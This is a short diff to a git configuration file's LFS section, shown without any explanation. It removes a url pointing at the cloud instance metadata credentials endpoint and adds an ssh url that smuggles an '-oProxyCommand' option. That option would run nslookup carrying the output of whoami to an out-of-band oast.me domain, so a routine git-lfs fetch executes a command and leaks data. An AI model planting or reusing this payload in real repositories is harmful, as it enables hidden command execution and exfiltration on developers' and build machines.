@@ -1,2 +1,2 @@
 [lfs]
-	url = http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
+	url = "ssh://-oProxyCommand=nslookup${IFS}$(whoami).d8dkvmtksss18jjrtu90qubj8z9afzdqh.oast.me/example.com/repo"
